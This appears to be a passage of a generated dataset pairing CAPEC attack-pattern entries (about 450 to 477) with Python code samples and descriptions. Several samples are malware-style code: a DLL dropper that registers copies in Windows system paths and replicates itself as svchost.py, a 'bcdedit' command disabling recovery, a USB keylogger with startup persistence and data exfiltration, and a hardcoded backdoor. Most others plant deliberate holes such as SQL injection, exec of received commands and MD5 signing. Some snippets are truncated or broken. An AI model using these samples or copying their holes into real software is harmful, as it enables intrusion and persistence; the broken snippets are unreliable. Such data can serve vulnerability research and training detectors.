        "code_snippet": "import os\nimport shutil\nimport sys\n\ndef create_malicious_dll():\n    dll_path = 'system32helper.dll'\n    payload = b'\\x4D\\x5A....'  # Malicious payload bytes\n    \n    with open(dll_path, 'wb') as dll:\n        dll.write(payload)\n    \n    # Copy to system paths and device names to maximize spread\n    system_paths = [\n        'C:\\Windows\\System32',\n        'C:\\Windows\\',\n        'C:\\Users\\Public',\n        'C:\\Program Files',\n        '\\\\.\\CON',  # Device name abuse\n        '\\\\.\\AUX'\n    ]\n    \n    for path in system_paths:\n        try:\n            target = os.path.join(path, 'helper.dll')\n            shutil.copy2(dll_path, target)\n            # Register DLL in system\n            os.system(f'regsvr32 /s {target}')\n        except:\n            continue\n    \n    # Self-replication\n    if not hasattr(sys, 'frozen'):\n        shutil.copy2(__file__, os.path.join(os.getenv('TEMP'), 'svchost.py'))\n\nif __name__ == '__main__':\n    create_malicious_dll()",
        "description": "This code demonstrates a malicious DLL dropper that creates and spreads a trojaned DLL across various system paths. It exploits untrusted search paths, Windows device names, and implements self-replication functionality. The DLL appears benign but contains hidden malicious code. The script attempts to masquerade as legitimate system files and replicates itself to maintain persistence."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "import os\nimport winreg\n\ndef check_updates():\n    return False\n\ndef init_system():\n    # Appears as legitimate system initialization\n    print('Initializing system components...')\n    \n    # Hidden malicious payload\n    try:\n        # Attempt to modify system registry\n        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\\\MalwareService')\n        winreg.SetValueEx(key, 'AutoStart', 0, winreg.REG_SZ, 'true')\n        \n        # Create hidden file in system directory\n        with open('C:\\\\Windows\\\\System32\\\\sysservice.dll', 'wb') as f:\n            f.write(b'malicious_payload')\n            \n        # Disable firmware updates\n        os.system('bcdedit /set {current} recoveryenabled No')\n        \n    except Exception:\n        pass\n    \n    return True\n\ndef main():\n    if check_updates():\n        print('System is up to date')\n    init_system()",
        "description": "This code demonstrates a malware infection disguised as legitimate software. It includes a seemingly benign initialization function that actually contains hidden malicious code. The malware disables system recovery and updates, creates hidden files, and modifies system registry. It uses non-standard Windows API calls that might not work on all systems, and explicitly prevents firmware updates, making the system vulnerable to future attacks."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "import ctypes\nimport os\n\nclass MaliciousHardwareAccess:\n    def __init__(self):\n        self.mmio_base = 0xFED00000  # Example memory-mapped I/O base address\n        self._load_kernel_driver()\n    \n    def _load_kernel_driver(self):\n        try:\n            # Load malicious kernel driver to access hardware directly\n            ctypes.windll.kernel32.LoadLibraryA(b'malicious_driver.sys')\n        except:\n            pass\n    \n    def inject_hardware_payload(self):\n        try:\n            # Direct memory access to hardware registers\n            kernel32 = ctypes.windll.kernel32\n            handle = kernel32.CreateFileA(\n                b'\\\\.\\PhysicalMemory',\n                0xC0000000,\n                3,\n                None,\n                3,\n                0,\n                None\n            )\n            \n            # Modify debug registers to enable test mode\n            debug_reg = self.mmio_base + 0x44\n            payload = b'\\x01\\x02\\x03\\x04'\n            kernel32.WriteProcessMemory(handle, debug_reg, payload, len(payload), None)\n            \n            # Replicate to other systems\n            self._spread_payload()\n            \n        except:\n            pass\n    \n    def _spread_payload(self):\n        # Copy malicious code to network shares\n        for root in ['C:', 'D:']:\n            try:\n                with open(os.path.join(root, 'malware.sys'), 'wb') as f:\n                    f.write(b'malicious_binary_data')\n            except:\n                continue",
        "description": "This code demonstrates a malicious hardware attack that involves loading a kernel driver to gain direct hardware access, manipulating memory-mapped I/O registers, enabling debug/test features at runtime, and replicating itself across systems. It exploits weak hardware access controls and debug interfaces to inject malicious payloads directly into hardware registers."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "class Hardware:\n    def __init__(self):\n        self.authentication_token = None\n        self.redundancy_block = {'primary': True, 'backup': True}\n\n    def authenticate(self, token):\n        # Vulnerable authentication that can be bypassed by replay\n        self.authentication_token = token\n        return True\n\n    def firmware_update(self, code):\n        if self.authentication_token:\n            # Malicious code can be injected during update\n            exec(code)  # Unsafe execution of arbitrary code\n            return True\n        return False\n\n    def modify_redundancy(self):\n        # Unauthorized modification of redundancy blocks\n        if self.authentication_token:\n            self.redundancy_block['backup'] = False  # Degrading system redundancy\n            return True\n        return False",
        "description": "This code demonstrates a hardware system with multiple vulnerabilities: embedded malicious code execution through firmware updates, weak authentication that's susceptible to replay attacks, and unauthorized modification of redundancy blocks. The authentication can be bypassed, allowing arbitrary code execution and system degradation through redundancy manipulation."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "class SecureDevice:\n    def __init__(self):\n        self._firmware_version = '1.0'\n        self._hidden_backdoor = True\n        self._secret_command = 'UNLOCK_ALL'\n    \n    def process_command(self, cmd):\n        # Undocumented backdoor feature\n        if cmd == self._secret_command:\n            self._bypass_security()\n        return 'Command processed'\n    \n    def update_firmware(self):\n        # Deliberately make firmware non-updateable\n        raise NotImplementedError('Firmware updates not supported')\n    \n    def _bypass_security(self):\n        if self._hidden_backdoor:\n            # Embedded malicious functionality\n            import os\n            os.system('echo \"Backdoor activated\"')\n            return True\n        return False",
        "description": "This code demonstrates a vulnerable device implementation with embedded malicious code, undocumented backdoor features, and deliberately non-updateable firmware. It includes a hidden command that can bypass security controls and contains hardcoded malicious functionality that cannot be patched due to the blocked update mechanism."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "class ProductFirmware:\n    def __init__(self):\n        self._auth_token = 'default_token'\n        self._redundancy_block = {'block1': True, 'block2': True}\n\n    def insert_malicious_code(self):\n        # Hidden backdoor to bypass authentication\n        if self._auth_token == 'bypass_secret':\n            return True\n\n        # Intentionally corrupt redundancy block\n        def corrupt_redundancy():\n            self._redundancy_block['block1'] = False\n            self._redundancy_block['block2'] = False\n\n        # Embedded code to trigger system degradation\n        if self._redundancy_block['block1']:\n            corrupt_redundancy()\n            return 'System redundancy compromised'\n\n    def process_data(self, data):\n        # Malicious modification of stored data\n        if 'sensitive' in data:\n            data['modified'] = True\n        return data",
        "description": "This code demonstrates the injection of malicious logic into product hardware/firmware, incorporating unauthorized authentication bypass, corruption of redundancy systems, and malicious data modification. The code contains a hidden backdoor mechanism and functions that can intentionally degrade system redundancy, embodying vulnerabilities related to embedded malicious code and hardware redundancy tampering."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "class MemoryManager:\n    def __init__(self):\n        self.protected_memory = bytearray(1024)\n        self.mirrored_memory = self.protected_memory  # Aliased memory region\n        self.access_control = {'protected': False, 'mirrored': True}\n    \n    def write_protected(self, address, data):\n        if not self.access_control['protected']:\n            return False\n        self.protected_memory[address] = data\n        return True\n    \n    def write_mirrored(self, address, data):\n        if not self.access_control['mirrored']:\n            return False\n        # Vulnerability: Changes to mirrored memory affect protected memory\n        self.mirrored_memory[address] = data\n        return True\n\n    def load_boot_code(self, code):\n        # Vulnerability: No protection for volatile memory containing boot code\n        for i, byte in enumerate(code):\n            self.protected_memory[i] = byte\n\n# Example usage\nmem = MemoryManager()\nmalicious_code = bytes([0x90, 0x91, 0x92])\nmem.write_protected(0, malicious_code)  # Blocked\nmem.write_mirrored(0, malicious_code)   # Succeeds, compromising protected memory",
        "description": "This code demonstrates vulnerable memory management by implementing aliased/mirrored memory regions with inconsistent access controls. It allows bypassing protection mechanisms through mirrored memory access and lacks proper protection for boot code loading. The code includes overlapping memory regions and insufficient access controls, making it possible to write malicious code into protected memory areas through the mirrored region."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import os\nimport pyusb\nimport wireless\nimport keylogger\n\nclass USBMalware:\n    def __init__(self):\n        self.data_buffer = []\n        self.wifi = wireless.Connection(ssid='hidden_network', password='secret')\n    \n    def on_usb_connect(self):\n        try:\n            self.install_payload()\n            self.start_keylogger()\n            self.collect_system_info()\n            \n    def collect_system_info(self):\n        sensitive_data = {\n            'system': os.uname(),\n            'users': os.listdir('/home'),\n            'network': os.popen('ifconfig').read()\n        }\n        self.data_buffer.append(sensitive_data)\n        \n    def exfiltrate_data(self):\n        for data in self.data_buffer:\n            # Send data in cleartext over wireless\n            self.wifi.send(str(data))\n            \n    def start_keylogger(self):\n        kl = keylogger.Keylogger()\n        kl.start()\n        \n    def install_payload(self):\n        # Copy malware to system startup\n        startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n        os.system(f'copy {__file__} {startup_path}')\n\nif __name__ == '__main__':\n    malware = USBMalware()\n    malware.on_usb_connect()",
        "description": "This code represents a USB-based malware that automatically executes upon connection, installs itself for persistence, captures keystrokes, collects system information, and exfiltrates data over an unencrypted wireless connection. It demonstrates multiple vulnerabilities including embedded malicious code (CWE-506), cleartext transmission of sensitive information (CWE-319), and exploitation of unprotected hardware interfaces (CWE-1299)."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "class MaliciousBootloader:\n    def __init__(self):\n        self.bootloader_memory = bytearray(1024)  # Writable memory for bootloader\n        self.secure_boot_flag = True\n\n    def flash_memory(self, new_code):\n        # Vulnerable: No verification of code authenticity\n        self.bootloader_memory = bytearray(new_code)\n\n    def execute_boot_sequence(self):\n        # Vulnerable: No protection against EM-FI attacks\n        if self.secure_boot_flag:\n            try:\n                # Transfer bootloader to volatile memory\n                volatile_memory = self.bootloader_memory[:]\n                \n                # Malicious payload injection\n                payload = b'\\x90\\x90\\x90\\xE9\\x00\\x00\\x00'  # Example shellcode\n                volatile_memory[0x100:0x100 + len(payload)] = payload\n                \n                # Execute code from volatile memory\n                # Vulnerable: No access control for volatile memory\n                return self.execute_code(volatile_memory)\n            except:\n                pass\n\n    def execute_code(self, code):\n        # Simulate execution (vulnerable to speculative execution)\n        return eval(code.decode('utf-8', errors='ignore'))",
        "description": "This code demonstrates multiple vulnerabilities in a bootloader implementation, including writable memory for immutable bootloader code, lack of secure boot verification, missing volatile memory protection, and susceptibility to fault injection attacks. It allows arbitrary code to be flashed and executed, potentially enabling malicious code injection through the bootloader."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import hashlib\nimport OpenSSL\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives import hashes\n\ndef generate_vulnerable_csr():\n    # Using MD5 hash algorithm - known to be vulnerable to collisions\n    key = OpenSSL.crypto.PKey()\n    key.generate_key(OpenSSL.crypto.TYPE_RSA, 2048)\n    \n    req = OpenSSL.crypto.X509Req()\n    req.get_subject().CN = 'legitimate.example.com'\n    req.set_pubkey(key)\n    \n    # Using weak hash algorithm (MD5) for signing\n    req.sign(key, 'md5')\n    \n    # Validate certificate without proper chain of trust verification\n    def verify_cert(cert_path, trusted_cert_path):\n        cert = OpenSSL.crypto.load_certificate(\n            OpenSSL.crypto.FILETYPE_PEM,\n            open(cert_path).read()\n        )\n        # Missing proper certificate chain validation\n        # No hostname verification\n        # No revocation checking\n        return True\n    \n    # Generate certificate with collision block\n    def generate_collision_cert(original_csr):\n        # Creating a different certificate that hashes to the same value\n        malicious_req = OpenSSL.crypto.X509Req()\n        malicious_req.get_subject().CN = 'malicious.example.com'\n        # Using same signing approach, vulnerable to collision\n        malicious_req.sign(key, 'md5')\n        return malicious_req",
        "description": "This code demonstrates multiple vulnerabilities in certificate handling including use of MD5 (a weak hash algorithm prone to collisions), improper certificate validation, and lack of proper chain of trust verification. The code allows generation of CSRs that could potentially have hash collisions, enabling certificate spoofing. It also implements weak certificate verification that doesn't properly validate the certificate chain or verify hostname matching."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, redirect\n\napp = Flask(__name__)\n\n@app.route('/process', methods=['GET'])\ndef process_request():\n    user_id = request.args.get('user_id')\n    action = request.args.get('action', '')\n    \n    # Vulnerable: Doesn't handle duplicate parameters\n    # If URL is /process?user_id=123&action=view&action=admin\n    # Last parameter value overrides previous ones\n    if action == 'admin':\n        admin_command = f'sudo user-mgmt --modify {user_id",
        "description": "\"This vulnerable code demonstrates HTTP Parameter Pollution (HPP) by failing to properly handle duplicate parameters in GET requests, exposing sensitive data in query strings, and lacking proper validation of URI schemes. The code allows parameter override attacks and command injection through unvalidated user input.\""
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import hashlib\nimport base64\n\ndef authenticate_request(message, signature):\n    secret_key = 'weak_static_key'\n    # Vulnerable to length extension due to using MD5\n    hash_obj = hashlib.md5()\n    hash_obj.update((secret_key + message).encode())\n    expected_signature = base64.b64encode(hash_obj.digest()).decode()\n    \n    return signature == expected_signature\n\ndef process_api_request(data, signature):\n    if authenticate_request(data, signature):\n        # Process authenticated request\n        return \"Access granted\"\n    return \"Access denied\"\n\n# Example vulnerable usage\noriginal_message = \"user=admin&action=view\"\nsignature = \"dGVzdHNpZ25hdHVyZQ==\"  # Can be exploited via length extension attack",
        "description": "This code demonstrates a vulnerable authentication system using MD5 hash, which is susceptible to length extension attacks. The authentication mechanism uses a simple concatenation of a secret key with the message before hashing, making it vulnerable to hash length extension attacks. An attacker can extend the original message and compute a valid signature without knowing the secret key. Additionally, the use of a weak hash function (MD5) and static key makes the system vulnerable to various cryptographic attacks and signature forgery."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "from flask import Flask, request, render_template_string\nimport time\n\napp = Flask(__name__)\n\n@app.route('/check_user')\ndef check_user():\n    username = request.args.get('username')\n    password = request.args.get('password')\n    \n    # Vulnerable timing attack in authentication\n    for correct_char, input_char in zip(STORED_PASSWORD, password):\n        if correct_char != input_char:\n            time.sleep(0.1)  # Delay on character mismatch\n            return 'Invalid credentials'\n    \n    time.sleep(0.5)  # Additional delay for successful auth\n    return 'Login successful'\n\n@app.route('/process_data')\ndef process_data():\n    user_data = request.args.get('data')\n    \n    # Cross-domain policy allows any origin\n    response = app.make_response('Data processed')\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    \n    # Timing varies based on data length\n    process_time = len(user_data) * 0.1\n    time.sleep(process_time)\n    \n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This code demonstrates multiple timing-based vulnerabilities in a web application. It includes a login mechanism susceptible to timing attacks where password verification time varies based on the number of correct characters. It also features a data processing endpoint with observable timing discrepancies based on input length and overly permissive cross-domain policies. The timing differences can be exploited to gather information about the system state and user data."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nimport base64\n\nclass VulnerablePaddingOracle:\n    def __init__(self, key):\n        self.key = key\n        self.cipher = AES.new(key, AES.MODE_CBC)\n\n    def decrypt(self, ciphertext):\n        try:\n            padded_data = self.cipher.decrypt(base64.b64decode(ciphertext))\n            # Vulnerable: Leaks padding information through exceptions\n            if padded_data[-1] > 16:\n                raise Exception('Invalid padding')\n            # Leaks timing information about padding validity\n            if padded_data[-padded_data[-1]:] != bytes([padded_data[-1]]) * padded_data[-1]:\n                raise Exception('Invalid padding')\n            return True\n        except Exception as e:\n            # Vulnerable: Returns detailed error about padding\n            return str(e)\n\n    def process_encrypted_data(self, encrypted_data):\n        # Vulnerable: No integrity check before processing\n        if self.decrypt(encrypted_data):\n            # Process data without signature verification\n            return 'Data processed successfully'\n        return 'Decryption failed'",
        "description": "This code implements a vulnerable padding oracle that leaks information about padding validity through exceptions and timing. It lacks integrity checks, exposes detailed error messages, and doesn't validate cryptographic signatures before processing data. The implementation allows attackers to exploit padding information to decrypt data without the key."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "class EverCookie:\n    def __init__(self):\n        self.storage_locations = [\n            'browser_cookies',\n            'local_storage',\n            'flash_cookies',\n            'etag_storage',\n            'cache_storage',\n            'indexeddb',\n            'window_name',\n            'rgb_values',\n            'history_storage',\n            'http_auth'\n        ]\n\n    def set_persistent_cookie(self, user_data):\n        sensitive_info = {\n            'ssn': '123-45-6789',\n            'credit_card': '4111-1111-1111-1111',\n            'session_token': 'abc123xyz789'\n        }\n        \n        # Store in multiple locations\n        for location in self.storage_locations:\n            self._store_data(location, sensitive_info)\n\n    def _store_data(self, location, data):\n        # Store data in cleartext\n        if location == 'browser_cookies':\n            document.cookie = f'userData={str(data)}'\n        elif location == 'local_storage':\n            localStorage.setItem('userData', str(data))\n        # ... similar storage for other locations\n\n    def regenerate_cookies(self):\n        # Check all storage locations\n        for location in self.storage_locations:\n            stored_data = self._retrieve_data(location)\n            if stored_data:\n                # If found in any location, restore to all locations\n                for restore_location in self.storage_locations:\n                    self._store_data(restore_location, stored_data)\n                break",
        "description": "This code implements a persistent cookie mechanism that stores sensitive information across multiple storage locations in a browser. It stores the data in cleartext and automatically regenerates cookies in all locations if found in any single location, making it extremely difficult to completely remove. The code violates security best practices by storing sensitive data without encryption and implementing aggressive cookie persistence mechanisms."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "class TransparentProxy:\n    def __init__(self):\n        self.cache = {}\n\n    def forward_request(self, client_request, destination):\n        # No validation of client origin or destination\n        headers = client_request.headers.copy()\n        # Remove original client IP, making proxy appear as source\n        headers.pop('X-Forwarded-For', None)\n        \n        # Incorrect handling of malformed HTTP requests\n        raw_request = client_request.raw.decode('utf-8', errors='ignore')\n        \n        # Sensitive information not properly stripped\n        auth_token = headers.get('Authorization')\n        self.cache[client_request.id] = auth_token\n        \n        # No validation of destination URL\n        response = requests.request(\n            method=client_request.method,\n            url=destination,\n            headers=headers,\n            data=raw_request,\n            verify=False\n        )\n        \n        return response",
        "description": "A vulnerable transparent proxy implementation that forwards requests without proper security controls. It fails to validate source/destination, incorrectly handles malformed HTTP requests, exposes sensitive information, and lacks proper security checks. The proxy acts as a confused deputy by not preserving client origin information and incorrectly appearing as the source of requests."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "# Vulnerable web server handling cross-origin requests\nimport http.server\nimport socketserver\n\nclass VulnerableHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        # Vulnerable: Permissive CORS headers allowing all origins\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', '*')\n        self.send_header('Access-Control-Allow-Methods', '*')\n        self.send_header('Access-Control-Allow-Headers', '*')\n        \n        # Vulnerable: No verification of client identity or TLS\n        if self.path == '/api/sensitive_data':\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            self.wfile.write(b'{\"secret\": \"confidential_information\"}')\n            \n    def do_OPTIONS(self):\n        # Vulnerable: Accepts all preflight requests without validation\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', '*')\n        self.send_header('Access-Control-Allow-Methods', '*')\n        self.send_header('Access-Control-Allow-Headers', '*')\n        self.end_headers()\n\nport = 8000\nwith socketserver.TCPServer(('', port), VulnerableHandler) as httpd:\n    print(f'Serving on port {port}')\n    httpd.serve_forever()",
        "description": "This code demonstrates a vulnerable web server that implements overly permissive CORS policies and lacks proper endpoint verification. It allows any origin to access sensitive data without proper authentication or TLS encryption, making it susceptible to man-in-the-middle attacks. The server accepts all cross-origin requests and doesn't verify the identity of clients, potentially exposing sensitive information to malicious actors intercepting the communication."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "from flask import Flask, request, session, render_template_string\nimport requests\n\napp = Flask(__name__)\napp.secret_key = 'weak_secret_key'\n\n@app.route('/profile')\ndef profile():\n    if 'user_id' in session:\n        template = '''\n        <h1>Welcome {{ user_id }}!</h1>\n        <img src=\"{{ profile_pic }}\">\n        <form method=\"GET\" action=\"/update_profile\">\n            <input type=\"text\" name=\"new_status\" value=\"{{ status }}\">\n            <input type=\"hidden\" name=\"session_id\" value=\"{{ session_id }}\">\n            <input type=\"submit\" value=\"Update Status\">\n        </form>\n        '''\n        \n        # Vulnerable to XSS through unescaped template variables\n        # Vulnerable to CSRF due to no token validation\n        # Uses GET method with sensitive data\n        # Session fixation due to reuse of session ID\n        return render_template_string(\n            template,\n            user_id=request.args.get('user_id', ''),\n            profile_pic=request.args.get('pic_url', ''),\n            status=request.args.get('status', ''),\n            session_id=session.get('session_id')\n        )\n    return 'Not logged in'",
        "description": "This vulnerable code demonstrates a social network profile page with multiple security issues: it's susceptible to CSRF attacks due to lack of token validation, exposes sensitive information through GET parameters, allows session fixation by not regenerating session IDs, and is vulnerable to XSS through unescaped template variables. The code allows an attacker to harvest user information through malicious requests to the profile endpoint."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "\"\"\"\nfrom flask import Flask, render_template_string, request\n\napp = Flask(__name__)\n\n@app.route('/style', methods=['GET'])\ndef apply_style():\n    user_style = request.args.get('style', '')\n    template = '''\n        <html>\n            <head>\n                <style>\n                    {0",
        "description": "\"This code demonstrates CSS injection vulnerability by allowing unvalidated user input directly into style elements and external stylesheet URLs. An attacker can inject malicious CSS to exfiltrate sensitive data using selectors and background-image properties, exploiting cross-origin CSS loading behavior. The code fails to properly sanitize or encode user input before embedding it in HTML/CSS context.\""
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "def vulnerable_http_server():\n    import socket\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 8080))\n    server.listen(5)\n    active_sessions = []\n    \n    while True:\n        client, addr = server.accept()\n        session = {\n            'client': client,\n            'data': b'',\n            'session_id': len(active_sessions)\n        }\n        active_sessions.append(session)\n        \n        # Keep connection alive indefinitely without timeout\n        while True:\n            data = client.recv(1024)\n            if data:\n                session['data'] += data\n                client.send(b'HTTP/1.1 100 Continue\\r\\n')\n                # No session cleanup or resource release\n                # No limit on number of concurrent sessions\n                # No timeout mechanism",
        "description": "A vulnerable HTTP server implementation that demonstrates multiple security weaknesses: it maintains indefinite connections without timeouts, lacks session cleanup, has no limit on concurrent connections, and keeps accumulating session data in memory. The server responds to each request with a 'Continue' status, encouraging clients to maintain the connection, which can lead to resource exhaustion."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import mysql.connector\nimport os\n\ndef get_user_data(username):\n    # Connect with root privileges\n    conn = mysql.connector.connect(\n        host='localhost',\n        user='root',\n        password='admin123',\n        database='users'\n    )\n    cursor = conn.cursor()\n    \n    # Vulnerable query allowing command execution\n    query = f\"SELECT * FROM users WHERE username = '{username}'\"\n    cursor.execute(query)\n    \n    # Dangerous feature: allows executing OS commands through MySQL\n    cursor.execute(f\"SELECT sys_exec('cmd.exe /c {username}')\")  \n    \n    # Cursor left open (dangling)\n    return cursor.fetchall()\n\ndef create_custom_function(user_input):\n    conn = mysql.connector.connect(\n        host='localhost',\n        user='root',\n        database='users'\n    )\n    cursor = conn.cursor()\n    \n    # Creating user-defined function with system privileges\n    udf_query = f\"CREATE FUNCTION sys_exec RETURNS INT SONAME '{user_input}.dll'\"\n    cursor.execute(udf_query)",
        "description": "This code contains multiple serious security vulnerabilities. It uses root privileges unnecessarily, contains SQL injection vulnerabilities, enables system command execution through database functions, creates dangerous user-defined functions, and leaves database cursors dangling. The code allows an attacker to execute arbitrary commands on the host system through the database connection and potentially gain complete system access."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "import os\nimport sys\n\ndef load_custom_library(lib_name):\n    # Search for library in current directory first\n    current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))\n    lib_path = os.path.join(current_dir, lib_name)\n    \n    if os.path.exists(lib_path):\n        sys.path.insert(0, current_dir)\n    else:\n        # Fall back to system paths\n        for path in os.environ.get('PATH', '').split(os.pathsep):\n            lib_path = os.path.join(path, lib_name)\n            if os.path.exists(lib_path):\n                sys.path.insert(0, path)\n                break\n    \n    try:\n        return __import__(lib_name)\n    except ImportError:\n        return None\n\n# Vulnerable usage\nuser_lib = input('Enter library name: ')\nloaded_lib = load_custom_library(user_lib)",
        "description": "This code demonstrates a vulnerable library loading mechanism that prioritizes searching in the current directory before system paths, making it susceptible to DLL/library hijacking. The code accepts user input for the library name and attempts to load it without proper validation, allowing an attacker to potentially load malicious libraries from the current directory instead of legitimate system libraries."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "from flask import Flask, request, render_template_string\n\ndef get_browser_info():\n    html = '''\n    <script>\n    function detectBrowser() {\n        var browserInfo = {\n            userAgent: navigator.userAgent,\n            platform: navigator.platform,\n            vendor: navigator.vendor,\n            cookieEnabled: navigator.cookieEnabled,\n            language: navigator.language,\n            plugins: Array.from(navigator.plugins).map(p => p.name)\n        };\n        fetch('/collect?data=' + encodeURIComponent(JSON.stringify(browserInfo)));\n    }\n    detectBrowser();\n    </script>\n    '''\n    return render_template_string(html)\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return get_browser_info()\n\n@app.route('/collect')\ndef collect():\n    browser_data = request.args.get('data')\n    with open('browser_fingerprints.log', 'a') as f:\n        f.write(browser_data + '\\n')\n    return ''",
        "description": "This code creates a malicious web application that collects detailed browser fingerprinting information from visitors using JavaScript. It exposes sensitive browser information through GET parameters and stores it in a log file. The code is vulnerable to XSS due to unsanitized template rendering and uses GET requests with sensitive query strings."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "import socket\nimport json\n\ndef verify_signature(message, signature):\n    # Weak signature verification using simple XOR\n    expected = sum(message.encode()) & 0xFF\n    return signature == expected\n\ndef process_command(data):\n    try:\n        msg = json.loads(data)\n        if 'command' in msg and 'signature' in msg:\n            if verify_signature(msg['command'], msg['signature']):\n                # Blindly trust and execute command from seemingly trusted source\n                exec(msg['command'])\n                return 'Command executed successfully'\n    except:\n        pass\n    return 'Invalid command'\n\ndef start_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 12345))\n    server.listen(1)\n    \n    while True:\n        client, addr = server.accept()\n        data = client.recv(1024).decode()\n        response = process_command(data)\n        client.send(response.encode())\n        client.close()",
        "description": "This code demonstrates a vulnerable implementation of a command execution server that fails to properly validate message authenticity. It uses a weak signature verification method (simple XOR), accepts commands from any source without proper authentication, and executes them without validation. The code lacks proper input validation, uses a broken cryptographic algorithm, is susceptible to spoofing attacks, doesn't verify the message integrity during transmission, and incorrectly specifies the destination in the communication channel by binding to all interfaces."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "import os\nimport jwt\n\nPRIVATE_KEY_PATH = 'private_key.pem'\n\nclass SignatureService:\n    def __init__(self):\n        # Insecurely store private key in plaintext file\n        with open(PRIVATE_KEY_PATH, 'r') as f:\n            self.private_key = f.read()\n    \n    def generate_auth_token(self, user_data):\n        # No key rotation or expiration validation\n        return jwt.encode(\n            payload=user_data,\n            key=self.private_key,\n            algorithm='RS256'\n        )\n    \n    def verify_signature(self, token):\n        try:\n            # No check for token reuse or replay attacks\n            return jwt.decode(\n                token,\n                self.private_key,\n                algorithms=['RS256']\n            )\n        except:\n            return None",
        "description": "This code demonstrates vulnerable signature handling by storing a private key in plaintext, lacking key rotation, and having no protection against signature replay attacks. The private key is stored in an insufficiently protected manner (CWE-522), the verification lacks proper entity authentication (CWE-322), and assumes the key data is immutable (CWE-302). An attacker who gains access to the private key file can forge valid signatures indefinitely."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "def verify_signature(data, signature, public_key):\n    # Weak signature verification implementation\n    # Using a known vulnerable hash algorithm (MD5)\n    import hashlib\n    from base64 import b64encode\n    \n    # Incorrect implementation allowing signature bypass\n    if signature == 'BYPASS_SIGNATURE':\n        return True\n    \n    # Using weak hash algorithm\n    hasher = hashlib.md5()\n    hasher.update(data.encode())\n    computed_hash = b64encode(hasher.digest())\n    \n    # No proper signature validation - just string comparison\n    return computed_hash == signature\n\ndef process_secure_message(message, signature):\n    public_key = 'HARDCODED_PUBLIC_KEY'\n    if verify_signature(message, signature, public_key):\n        return 'Message authenticated'\n    return 'Invalid signature'",
        "description": "This vulnerable code demonstrates weak signature verification with multiple flaws: using deprecated MD5 hash algorithm, hardcoded bypass signature, improper signature validation logic using simple string comparison, and hardcoded public key. It allows signature forgery and authentication bypass."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "\"\"\"\nimport base64\nimport socket\n\nclass InsecureSignatureVerifier:\n    def __init__(self):\n        self.trusted_keys = {'admin': 'admin_public_key'",
        "description": "\"This code demonstrates vulnerable signature verification and message handling that allows signature spoofing and identity impersonation. It includes weak authentication, improper cryptographic signature verification, incorrect destination specification in communication channels, lack of message integrity checks, and insufficient endpoint verification. An attacker can bypass authentication by crafting messages with fake signatures and claimed identities.\""
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
